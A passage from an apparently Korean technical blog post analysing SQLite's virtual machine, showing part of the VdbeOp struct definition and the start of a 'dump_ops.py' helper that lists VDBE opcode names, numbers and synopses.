</span></span><span style="display:flex;"><span>    FuncDef <span style="color:#f92672">*</span>pFunc;        <span style="color:#75715e">/* Used when p4type is P4_FUNCDEF */</span>
</span></span><span style="display:flex;"><span>    sqlite3_context <span style="color:#f92672">*</span>pCtx; <span style="color:#75715e">/* Used when p4type is P4_FUNCCTX */</span>
</span></span><span style="display:flex;"><span>    CollSeq <span style="color:#f92672">*</span>pColl;        <span style="color:#75715e">/* Used when p4type is P4_COLLSEQ */</span>
</span></span><span style="display:flex;"><span>    Mem <span style="color:#f92672">*</span>pMem;             <span style="color:#75715e">/* Used when p4type is P4_MEM */</span>
</span></span><span style="display:flex;"><span>    VTable <span style="color:#f92672">*</span>pVtab;         <span style="color:#75715e">/* Used when p4type is P4_VTAB */</span>
</span></span><span style="display:flex;"><span>    KeyInfo <span style="color:#f92672">*</span>pKeyInfo;     <span style="color:#75715e">/* Used when p4type is P4_KEYINFO */</span>
</span></span><span style="display:flex;"><span>    u32 <span style="color:#f92672">*</span>ai;               <span style="color:#75715e">/* Used when p4type is P4_INTARRAY */</span>
</span></span><span style="display:flex;"><span>    SubProgram <span style="color:#f92672">*</span>pProgram;  <span style="color:#75715e">/* Used when p4type is P4_SUBPROGRAM */</span>
</span></span><span style="display:flex;"><span>    Table <span style="color:#f92672">*</span>pTab;           <span style="color:#75715e">/* Used when p4type is P4_TABLE */</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifdef SQLITE_ENABLE_CURSOR_HINTS
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    Expr <span style="color:#f92672">*</span>pExpr;           <span style="color:#75715e">/* Used when p4type is P4_EXPR */</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  } p4;
</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifdef SQLITE_ENABLE_EXPLAIN_COMMENTS
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>zComment;          <span style="color:#75715e">/* Comment to improve readability */</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#ifdef SQLITE_VDBE_COVERAGE
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  u32 iSrcLine;            <span style="color:#75715e">/* Source-code line that generated this opcode
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                           ** with flags in the upper 8 bits */</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#if defined(SQLITE_ENABLE_STMT_SCANSTATUS) || defined(VDBE_PROFILE)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  u64 nExec;
</span></span><span style="display:flex;"><span>  u64 nCycle;
</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>};
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> VdbeOp VdbeOp;
</span></span></code></pre></div><p>분석 속도를 높히기 위해서 앞서 분석한 내용을 토대로 Ops를 dump하는 스크립트를 작성했다.</p>
<h4 id="dump_opspy">dump_ops.py<a hidden class="anchor" aria-hidden="true" href="#dump_opspy">#</a></h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>v<span style="color:#f92672">=</span>  <span style="color:#960050;background-color:#1e0010">&#39;&#39;&#39;</span>OP_Savepoint     <span style="color:#f92672">=</span>  <span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_AutoCommit    <span style="color:#f92672">=</span>  <span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_Transaction   <span style="color:#f92672">=</span>  <span style="color:#ae81ff">2</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_Checkpoint    <span style="color:#f92672">=</span>  <span style="color:#ae81ff">3</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_JournalMode   <span style="color:#f92672">=</span>  <span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_Vacuum        <span style="color:#f92672">=</span>  <span style="color:#ae81ff">5</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_VFilter       <span style="color:#f92672">=</span>  <span style="color:#ae81ff">6</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump, synopsis: iplan=r[P3] zplan=&#39;P4&#39;     */</span>
</span></span><span style="display:flex;"><span>OP_VUpdate       <span style="color:#f92672">=</span>  <span style="color:#ae81ff">7</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: data=r[P3@P2]                    */</span>
</span></span><span style="display:flex;"><span>OP_Init          <span style="color:#f92672">=</span>  <span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump, synopsis: Start at P2                */</span>
</span></span><span style="display:flex;"><span>OP_Goto          <span style="color:#f92672">=</span>  <span style="color:#ae81ff">9</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump                                       */</span>
</span></span><span style="display:flex;"><span>OP_Gosub         <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump                                       */</span>
</span></span><span style="display:flex;"><span>OP_InitCoroutine <span style="color:#f92672">=</span> <span style="color:#ae81ff">11</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump                                       */</span>
</span></span><span style="display:flex;"><span>OP_Yield         <span style="color:#f92672">=</span> <span style="color:#ae81ff">12</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump                                       */</span>
</span></span><span style="display:flex;"><span>OP_MustBeInt     <span style="color:#f92672">=</span> <span style="color:#ae81ff">13</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump                                       */</span>
</span></span><span style="display:flex;"><span>OP_Jump          <span style="color:#f92672">=</span> <span style="color:#ae81ff">14</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump                                       */</span>
</span></span><span style="display:flex;"><span>OP_Once          <span style="color:#f92672">=</span> <span style="color:#ae81ff">15</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump                                       */</span>
</span></span><span style="display:flex;"><span>OP_If            <span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump                                       */</span>
</span></span><span style="display:flex;"><span>OP_IfNot         <span style="color:#f92672">=</span> <span style="color:#ae81ff">17</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump                                       */</span>
</span></span><span style="display:flex;"><span>OP_IsType        <span style="color:#f92672">=</span> <span style="color:#ae81ff">18</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump, synopsis: if typeof(P1.P3) in P5 goto P2 */</span>
</span></span><span style="display:flex;"><span>OP_Not           <span style="color:#f92672">=</span> <span style="color:#ae81ff">19</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* same as TK_NOT, synopsis: r[P2]= !r[P1]    */</span>
</span></span><span style="display:flex;"><span>OP_IfNullRow     <span style="color:#f92672">=</span> <span style="color:#ae81ff">20</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump, synopsis: if P1.nullRow then r[P3]=NULL, goto P2 */</span>
</span></span><span style="display:flex;"><span>OP_SeekLT        <span style="color:#f92672">=</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump, synopsis: key=r[P3@P4]               */</span>
</span></span><span style="display:flex;"><span>OP_SeekLE        <span style="color:#f92672">=</span> <span style="color:#ae81ff">22</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump, synopsis: key=r[P3@P4]               */</span>
</span></span><span style="display:flex;"><span>OP_SeekGE        <span style="color:#f92672">=</span> <span style="color:#ae81ff">23</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump, synopsis: key=r[P3@P4]               */</span>
</span></span><span style="display:flex;"><span>OP_SeekGT        <span style="color:#f92672">=</span> <span style="color:#ae81ff">24</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump, synopsis: key=r[P3@P4]               */</span>
</span></span><span style="display:flex;"><span>OP_IfNotOpen     <span style="color:#f92672">=</span> <span style="color:#ae81ff">25</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump, synopsis: if( !csr[P1] ) goto P2     */</span>
</span></span><span style="display:flex;"><span>OP_IfNoHope      <span style="color:#f92672">=</span> <span style="color:#ae81ff">26</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump, synopsis: key=r[P3@P4]               */</span>
</span></span><span style="display:flex;"><span>OP_NoConflict    <span style="color:#f92672">=</span> <span style="color:#ae81ff">27</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump, synopsis: key=r[P3@P4]               */</span>
</span></span><span style="display:flex;"><span>OP_NotFound      <span style="color:#f92672">=</span> <span style="color:#ae81ff">28</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump, synopsis: key=r[P3@P4]               */</span>
</span></span><span style="display:flex;"><span>OP_Found         <span style="color:#f92672">=</span> <span style="color:#ae81ff">29</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump, synopsis: key=r[P3@P4]               */</span>
</span></span><span style="display:flex;"><span>OP_SeekRowid     <span style="color:#f92672">=</span> <span style="color:#ae81ff">30</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump, synopsis: intkey=r[P3]               */</span>
</span></span><span style="display:flex;"><span>OP_NotExists     <span style="color:#f92672">=</span> <span style="color:#ae81ff">31</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump, synopsis: intkey=r[P3]               */</span>
</span></span><span style="display:flex;"><span>OP_Last          <span style="color:#f92672">=</span> <span style="color:#ae81ff">32</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump                                       */</span>
</span></span><span style="display:flex;"><span>OP_IfSmaller     <span style="color:#f92672">=</span> <span style="color:#ae81ff">33</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump                                       */</span>
</span></span><span style="display:flex;"><span>OP_SorterSort    <span style="color:#f92672">=</span> <span style="color:#ae81ff">34</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump                                       */</span>
</span></span><span style="display:flex;"><span>OP_Sort          <span style="color:#f92672">=</span> <span style="color:#ae81ff">35</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump                                       */</span>
</span></span><span style="display:flex;"><span>OP_Rewind        <span style="color:#f92672">=</span> <span style="color:#ae81ff">36</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump                                       */</span>
</span></span><span style="display:flex;"><span>OP_SorterNext    <span style="color:#f92672">=</span> <span style="color:#ae81ff">37</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump                                       */</span>
</span></span><span style="display:flex;"><span>OP_Prev          <span style="color:#f92672">=</span> <span style="color:#ae81ff">38</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump                                       */</span>
</span></span><span style="display:flex;"><span>OP_Next          <span style="color:#f92672">=</span> <span style="color:#ae81ff">39</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump                                       */</span>
</span></span><span style="display:flex;"><span>OP_IdxLE         <span style="color:#f92672">=</span> <span style="color:#ae81ff">40</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump, synopsis: key=r[P3@P4]               */</span>
</span></span><span style="display:flex;"><span>OP_IdxGT         <span style="color:#f92672">=</span> <span style="color:#ae81ff">41</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump, synopsis: key=r[P3@P4]               */</span>
</span></span><span style="display:flex;"><span>OP_IdxLT         <span style="color:#f92672">=</span> <span style="color:#ae81ff">42</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump, synopsis: key=r[P3@P4]               */</span>
</span></span><span style="display:flex;"><span>OP_Or            <span style="color:#f92672">=</span> <span style="color:#ae81ff">43</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* same as TK_OR, synopsis: r[P3]=(r[P1] || r[P2]) */</span>
</span></span><span style="display:flex;"><span>OP_And           <span style="color:#f92672">=</span> <span style="color:#ae81ff">44</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* same as TK_AND, synopsis: r[P3]=(r[P1] &amp;&amp; r[P2]) */</span>
</span></span><span style="display:flex;"><span>OP_IdxGE         <span style="color:#f92672">=</span> <span style="color:#ae81ff">45</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump, synopsis: key=r[P3@P4]               */</span>
</span></span><span style="display:flex;"><span>OP_RowSetRead    <span style="color:#f92672">=</span> <span style="color:#ae81ff">46</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump, synopsis: r[P3]=rowset(P1)           */</span>
</span></span><span style="display:flex;"><span>OP_RowSetTest    <span style="color:#f92672">=</span> <span style="color:#ae81ff">47</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump, synopsis: if r[P3] in rowset(P1) goto P2 */</span>
</span></span><span style="display:flex;"><span>OP_Program       <span style="color:#f92672">=</span> <span style="color:#ae81ff">48</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump                                       */</span>
</span></span><span style="display:flex;"><span>OP_FkIfZero      <span style="color:#f92672">=</span> <span style="color:#ae81ff">49</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump, synopsis: if fkctr[P1]==0 goto P2    */</span>
</span></span><span style="display:flex;"><span>OP_IsNull        <span style="color:#f92672">=</span> <span style="color:#ae81ff">50</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump, same as TK_ISNULL, synopsis: if r[P1]==NULL goto P2 */</span>
</span></span><span style="display:flex;"><span>OP_NotNull       <span style="color:#f92672">=</span> <span style="color:#ae81ff">51</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump, same as TK_NOTNULL, synopsis: if r[P1]!=NULL goto P2 */</span>
</span></span><span style="display:flex;"><span>OP_Ne            <span style="color:#f92672">=</span> <span style="color:#ae81ff">52</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump, same as TK_NE, synopsis: IF r[P3]!=r[P1] */</span>
</span></span><span style="display:flex;"><span>OP_Eq            <span style="color:#f92672">=</span> <span style="color:#ae81ff">53</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump, same as TK_EQ, synopsis: IF r[P3]==r[P1] */</span>
</span></span><span style="display:flex;"><span>OP_Gt            <span style="color:#f92672">=</span> <span style="color:#ae81ff">54</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump, same as TK_GT, synopsis: IF r[P3]&gt;r[P1] */</span>
</span></span><span style="display:flex;"><span>OP_Le            <span style="color:#f92672">=</span> <span style="color:#ae81ff">55</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump, same as TK_LE, synopsis: IF r[P3]&lt;=r[P1] */</span>
</span></span><span style="display:flex;"><span>OP_Lt            <span style="color:#f92672">=</span> <span style="color:#ae81ff">56</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump, same as TK_LT, synopsis: IF r[P3]&lt;r[P1] */</span>
</span></span><span style="display:flex;"><span>OP_Ge            <span style="color:#f92672">=</span> <span style="color:#ae81ff">57</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump, same as TK_GE, synopsis: IF r[P3]&gt;=r[P1] */</span>
</span></span><span style="display:flex;"><span>OP_ElseEq        <span style="color:#f92672">=</span> <span style="color:#ae81ff">58</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump, same as TK_ESCAPE                    */</span>
</span></span><span style="display:flex;"><span>OP_IfPos         <span style="color:#f92672">=</span> <span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump, synopsis: if r[P1]&gt;0 then r[P1]-=P3, goto P2 */</span>
</span></span><span style="display:flex;"><span>OP_IfNotZero     <span style="color:#f92672">=</span> <span style="color:#ae81ff">60</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump, synopsis: if r[P1]!=0 then r[P1]--, goto P2 */</span>
</span></span><span style="display:flex;"><span>OP_DecrJumpZero  <span style="color:#f92672">=</span> <span style="color:#ae81ff">61</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump, synopsis: if (--r[P1])==0 goto P2    */</span>
</span></span><span style="display:flex;"><span>OP_IncrVacuum    <span style="color:#f92672">=</span> <span style="color:#ae81ff">62</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump                                       */</span>
</span></span><span style="display:flex;"><span>OP_VNext         <span style="color:#f92672">=</span> <span style="color:#ae81ff">63</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump                                       */</span>
</span></span><span style="display:flex;"><span>OP_Filter        <span style="color:#f92672">=</span> <span style="color:#ae81ff">64</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* jump, synopsis: if key(P3@P4) not in filter(P1) goto P2 */</span>
</span></span><span style="display:flex;"><span>OP_PureFunc      <span style="color:#f92672">=</span> <span style="color:#ae81ff">65</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: r[P3]=func(r[P2@NP])             */</span>
</span></span><span style="display:flex;"><span>OP_Function      <span style="color:#f92672">=</span> <span style="color:#ae81ff">66</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: r[P3]=func(r[P2@NP])             */</span>
</span></span><span style="display:flex;"><span>OP_Return        <span style="color:#f92672">=</span> <span style="color:#ae81ff">67</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_EndCoroutine  <span style="color:#f92672">=</span> <span style="color:#ae81ff">68</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_HaltIfNull    <span style="color:#f92672">=</span> <span style="color:#ae81ff">69</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: if r[P3]=null halt               */</span>
</span></span><span style="display:flex;"><span>OP_Halt          <span style="color:#f92672">=</span> <span style="color:#ae81ff">70</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_Integer       <span style="color:#f92672">=</span> <span style="color:#ae81ff">71</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: r[P2]=P1                         */</span>
</span></span><span style="display:flex;"><span>OP_Int64         <span style="color:#f92672">=</span> <span style="color:#ae81ff">72</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: r[P2]=P4                         */</span>
</span></span><span style="display:flex;"><span>OP_String        <span style="color:#f92672">=</span> <span style="color:#ae81ff">73</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: r[P2]=&#39;P4&#39; (len=P1)              */</span>
</span></span><span style="display:flex;"><span>OP_BeginSubrtn   <span style="color:#f92672">=</span> <span style="color:#ae81ff">74</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: r[P2]=NULL                       */</span>
</span></span><span style="display:flex;"><span>OP_Null          <span style="color:#f92672">=</span> <span style="color:#ae81ff">75</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: r[P2..P3]=NULL                   */</span>
</span></span><span style="display:flex;"><span>OP_SoftNull      <span style="color:#f92672">=</span> <span style="color:#ae81ff">76</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: r[P1]=NULL                       */</span>
</span></span><span style="display:flex;"><span>OP_Blob          <span style="color:#f92672">=</span> <span style="color:#ae81ff">77</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: r[P2]=P4 (len=P1)                */</span>
</span></span><span style="display:flex;"><span>OP_Variable      <span style="color:#f92672">=</span> <span style="color:#ae81ff">78</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: r[P2]=parameter(P1,P4)           */</span>
</span></span><span style="display:flex;"><span>OP_Move          <span style="color:#f92672">=</span> <span style="color:#ae81ff">79</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: r[P2@P3]=r[P1@P3]                */</span>
</span></span><span style="display:flex;"><span>OP_Copy          <span style="color:#f92672">=</span> <span style="color:#ae81ff">80</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: r[P2@P3+1]=r[P1@P3+1]            */</span>
</span></span><span style="display:flex;"><span>OP_SCopy         <span style="color:#f92672">=</span> <span style="color:#ae81ff">81</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: r[P2]=r[P1]                      */</span>
</span></span><span style="display:flex;"><span>OP_IntCopy       <span style="color:#f92672">=</span> <span style="color:#ae81ff">82</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: r[P2]=r[P1]                      */</span>
</span></span><span style="display:flex;"><span>OP_FkCheck       <span style="color:#f92672">=</span> <span style="color:#ae81ff">83</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_ResultRow     <span style="color:#f92672">=</span> <span style="color:#ae81ff">84</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: output=r[P1@P2]                  */</span>
</span></span><span style="display:flex;"><span>OP_CollSeq       <span style="color:#f92672">=</span> <span style="color:#ae81ff">85</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_AddImm        <span style="color:#f92672">=</span> <span style="color:#ae81ff">86</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: r[P1]=r[P1]+P2                   */</span>
</span></span><span style="display:flex;"><span>OP_RealAffinity  <span style="color:#f92672">=</span> <span style="color:#ae81ff">87</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_Cast          <span style="color:#f92672">=</span> <span style="color:#ae81ff">88</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: affinity(r[P1])                  */</span>
</span></span><span style="display:flex;"><span>OP_Permutation   <span style="color:#f92672">=</span> <span style="color:#ae81ff">89</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_Compare       <span style="color:#f92672">=</span> <span style="color:#ae81ff">90</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: r[P1@P3] &lt;-&gt; r[P2@P3]            */</span>
</span></span><span style="display:flex;"><span>OP_IsTrue        <span style="color:#f92672">=</span> <span style="color:#ae81ff">91</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: r[P2] = coalesce(r[P1]==TRUE,P3) ^ P4 */</span>
</span></span><span style="display:flex;"><span>OP_ZeroOrNull    <span style="color:#f92672">=</span> <span style="color:#ae81ff">92</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: r[P2] = 0 OR NULL                */</span>
</span></span><span style="display:flex;"><span>OP_Offset        <span style="color:#f92672">=</span> <span style="color:#ae81ff">93</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: r[P3] = sqlite_offset(P1)        */</span>
</span></span><span style="display:flex;"><span>OP_Column        <span style="color:#f92672">=</span> <span style="color:#ae81ff">94</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: r[P3]=PX cursor P1 column P2     */</span>
</span></span><span style="display:flex;"><span>OP_TypeCheck     <span style="color:#f92672">=</span> <span style="color:#ae81ff">95</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: typecheck(r[P1@P2])              */</span>
</span></span><span style="display:flex;"><span>OP_Affinity      <span style="color:#f92672">=</span> <span style="color:#ae81ff">96</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: affinity(r[P1@P2])               */</span>
</span></span><span style="display:flex;"><span>OP_MakeRecord    <span style="color:#f92672">=</span> <span style="color:#ae81ff">97</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: r[P3]=mkrec(r[P1@P2])            */</span>
</span></span><span style="display:flex;"><span>OP_Count         <span style="color:#f92672">=</span> <span style="color:#ae81ff">98</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: r[P2]=count()                    */</span>
</span></span><span style="display:flex;"><span>OP_ReadCookie    <span style="color:#f92672">=</span> <span style="color:#ae81ff">99</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_SetCookie     <span style="color:#f92672">=</span><span style="color:#ae81ff">100</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_ReopenIdx     <span style="color:#f92672">=</span><span style="color:#ae81ff">101</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: root=P2 iDb=P3                   */</span>
</span></span><span style="display:flex;"><span>OP_BitAnd        <span style="color:#f92672">=</span><span style="color:#ae81ff">102</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* same as TK_BITAND, synopsis: r[P3]=r[P1]&amp;r[P2] */</span>
</span></span><span style="display:flex;"><span>OP_BitOr         <span style="color:#f92672">=</span><span style="color:#ae81ff">103</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* same as TK_BITOR, synopsis: r[P3]=r[P1]|r[P2] */</span>
</span></span><span style="display:flex;"><span>OP_ShiftLeft     <span style="color:#f92672">=</span><span style="color:#ae81ff">104</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* same as TK_LSHIFT, synopsis: r[P3]=r[P2]&lt;&lt;r[P1] */</span>
</span></span><span style="display:flex;"><span>OP_ShiftRight    <span style="color:#f92672">=</span><span style="color:#ae81ff">105</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* same as TK_RSHIFT, synopsis: r[P3]=r[P2]&gt;&gt;r[P1] */</span>
</span></span><span style="display:flex;"><span>OP_Add           <span style="color:#f92672">=</span><span style="color:#ae81ff">106</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* same as TK_PLUS, synopsis: r[P3]=r[P1]+r[P2] */</span>
</span></span><span style="display:flex;"><span>OP_Subtract      <span style="color:#f92672">=</span><span style="color:#ae81ff">107</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* same as TK_MINUS, synopsis: r[P3]=r[P2]-r[P1] */</span>
</span></span><span style="display:flex;"><span>OP_Multiply      <span style="color:#f92672">=</span><span style="color:#ae81ff">108</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* same as TK_STAR, synopsis: r[P3]=r[P1]*r[P2] */</span>
</span></span><span style="display:flex;"><span>OP_Divide        <span style="color:#f92672">=</span><span style="color:#ae81ff">109</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* same as TK_SLASH, synopsis: r[P3]=r[P2]/r[P1] */</span>
</span></span><span style="display:flex;"><span>OP_Remainder     <span style="color:#f92672">=</span><span style="color:#ae81ff">110</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* same as TK_REM, synopsis: r[P3]=r[P2]%r[P1] */</span>
</span></span><span style="display:flex;"><span>OP_Concat        <span style="color:#f92672">=</span><span style="color:#ae81ff">111</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* same as TK_CONCAT, synopsis: r[P3]=r[P2]+r[P1] */</span>
</span></span><span style="display:flex;"><span>OP_OpenRead      <span style="color:#f92672">=</span><span style="color:#ae81ff">112</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: root=P2 iDb=P3                   */</span>
</span></span><span style="display:flex;"><span>OP_OpenWrite     <span style="color:#f92672">=</span><span style="color:#ae81ff">113</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: root=P2 iDb=P3                   */</span>
</span></span><span style="display:flex;"><span>OP_BitNot        <span style="color:#f92672">=</span><span style="color:#ae81ff">114</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* same as TK_BITNOT, synopsis: r[P2]= ~r[P1] */</span>
